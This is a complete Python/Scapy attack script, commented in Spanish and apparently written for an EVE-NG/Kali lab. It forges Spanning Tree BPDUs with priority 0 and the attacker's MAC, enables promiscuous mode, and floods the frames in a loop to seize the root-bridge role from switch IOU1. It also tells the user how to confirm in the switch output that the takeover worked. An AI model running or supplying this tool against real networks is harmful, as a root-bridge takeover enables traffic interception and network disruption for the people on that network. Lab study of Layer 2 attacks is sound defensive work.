#!/usr/bin/env python3
# =====================================================
#   STP ROOT BRIDGE TAKEOVER
#   Objetivo : Desplazar Root Bridge de IOU1
#              Priority actual: 32769 | MAC: aabb.cc00.0100
#   Metodo   : Enviar BPDUs con Priority=0 + Bridge ID minimo
#   Uso      : sudo python3 stp_root_takeover.py
# =====================================================

import os, sys, time, subprocess
from scapy.all import *
from scapy.layers.l2 import Dot3, LLC, STP

# ── CONFIGURACION ──────────────────────────────────
IFACE      = "eth0"               # Cambia si tu interfaz es diferente (ip a)
STP_MCAST  = "01:80:c2:00:00:00"  # Destino multicast STP (IEEE 802.1D)
PRIORITY   = 0                    # 0 = menor posible, gana la eleccion STP
HELLO_TIME = 2                    # segundos entre BPDUs
# ───────────────────────────────────────────────────

ROJO    = "\033[91m"
VERDE   = "\033[92m"
AMARILLO= "\033[93m"
AZUL    = "\033[94m"
RESET   = "\033[0m"
BOLD    = "\033[1m"

def banner():
    print(f"""
{ROJO}{BOLD}╔══════════════════════════════════════════╗
║   STP ROOT BRIDGE TAKEOVER               ║
║   Objetivo: IOU1 Priority 32769          ║
║   Ataque  : Priority 0 → Kali = Root     ║
╚══════════════════════════════════════════╝{RESET}
""")

def check_root():
    if os.geteuid() != 0:
        print(f"{ROJO}[!] Ejecuta con sudo: sudo python3 {sys.argv[0]}{RESET}")
        sys.exit(1)

def get_mac(iface):
    try:
        mac = get_if_hwaddr(iface)
        return mac
    except Exception as e:
        print(f"{ROJO}[!] No se pudo obtener MAC de {iface}: {e}{RESET}")
        sys.exit(1)

def enable_promisc(iface):
    os.system(f"ip link set {iface} promisc on 2>/dev/null")
    print(f"{AZUL}[*] Modo promiscuo activado en {iface}{RESET}")

def check_l2_connectivity(iface, timeout=6):
    """Verifica que lleguen BPDUs del switch (confirma conectividad L2)"""
    print(f"{AMARILLO}[*] Verificando conectividad L2 — escuchando BPDUs por {timeout}s...{RESET}")
    pkts = sniff(
        iface=iface,
        filter="ether dst 01:80:c2:00:00:00",
        timeout=timeout,
        store=True
    )
    if pkts:
        print(f"{VERDE}[+] ¡BPDUs recibidos del switch! ({len(pkts)} paquetes) — Conexión L2 OK{RESET}\n")
        return True
    else:
        print(f"{AMARILLO}[!] No se detectaron BPDUs del switch.")
        print(f"[!] Posibles causas:")
        print(f"    1. VMware no está en modo promiscuo (VM > Settings > Network > Advanced > Allow All)")
        print(f"    2. El cable en EVE-NG no está conectado")
        print(f"    3. La interfaz correcta no es eth0 — verifica con: ip a{RESET}\n")
        resp = input("    ¿Continuar de todas formas? (s/n): ").strip().lower()
        return resp == 's'

def build_bpdu(kali_mac):
    """
    Construye un BPDU de Configuracion STP con:
      - Root Priority  = 0000  (campo priority en 0)
      - Root MAC       = MAC de Kali
      - Bridge ID      = 0 (prioridad minima absoluta)
      - PathCost       = 0 (costo cero al root = somos el root)
    """
    stp = STP(
        proto     = 0,
        version   = 0,
        bpdutype  = 0x00,       # 0x00 = Configuration BPDU
        bpduflags = 0x00,
        rootid    = PRIORITY,   # ← 0000 que ves en spanning-tree
        rootmac   = kali_mac,   # ← MAC de Kali como Root
        pathcost  = 0,          # ← Costo 0 = somos directamente el root
        bridgeid  = PRIORITY,   # ← Bridge Priority = 0
        bridgemac = kali_mac,
        portid    = 0x8001,
        age       = 0,
        maxage    = 20,
        hellotime = HELLO_TIME,
        fwddelay  = 15
    )
    frame = (
        Dot3(dst=STP_MCAST, src=kali_mac) /
        LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
        stp
    )
    return frame

def attack_loop(iface, kali_mac):
    pkt   = build_bpdu(kali_mac)
    count = 0
    print(f"{VERDE}{BOLD}[+] ATAQUE INICIADO{RESET}")
    print(f"{AZUL}    Kali MAC    : {kali_mac}")
    print(f"    Priority    : {PRIORITY} (0x0000)")
    print(f"    IOU1 actual : 32769 → será desplazado")
    print(f"    Hello Timer : cada {HELLO_TIME}s")
    print(f"\n{AMARILLO}    Verifica en IOU1:{RESET}")
    print(f"    IOU1# show spanning-tree\n")
    print(f"{ROJO}    Ctrl+C para detener{RESET}\n")

    start = time.time()
    try:
        while True:
            sendp(pkt, iface=iface, verbose=False)
            count += 1
            elapsed = int(time.time() - start)

            # Mensaje de estado
            if count == 1:
                estado = f"{AMARILLO}Esperando convergencia STP...{RESET}"
            elif elapsed < 15:
                estado = f"{AMARILLO}Convergencia STP en progreso (~30s)...{RESET}"
            else:
                estado = f"{VERDE}Root Bridge debería haber cambiado — verifica IOU1{RESET}"

            print(
                f"\r{AZUL}[+] BPDUs enviados: {BOLD}{count:>4}{RESET}{AZUL} | "
                f"Tiempo: {elapsed:>3}s | {estado}          {RESET}",
                end="", flush=True
            )
            time.sleep(HELLO_TIME)

    except KeyboardInterrupt:
        print(f"\n\n{AMARILLO}[!] Ataque detenido. BPDUs enviados: {count}{RESET}")
        print(f"\n{VERDE}[*] Comandos para verificar en IOU1:{RESET}")
        print(f"    IOU1# show spanning-tree")
        print(f"    IOU1# show spanning-tree detail")
        print(f"\n{VERDE}[*] Si el ataque fue exitoso verás:{RESET}")
        print(f"    Root ID  Priority  1")
        print(f"    Address  {kali_mac}  ← MAC de tu Kali\n")

# ── MAIN ───────────────────────────────────────────
if __name__ == "__main__":
    banner()
    check_root()

    kali_mac = get_mac(IFACE)
    print(f"{AZUL}[*] Interfaz : {IFACE}")
    print(f"[*] MAC Kali : {kali_mac}{RESET}\n")

    enable_promisc(IFACE)

    if not check_l2_connectivity(IFACE):
        print(f"{ROJO}[!] Abortando — sin conectividad L2.{RESET}")
        sys.exit(1)

    attack_loop(IFACE, kali_mac)
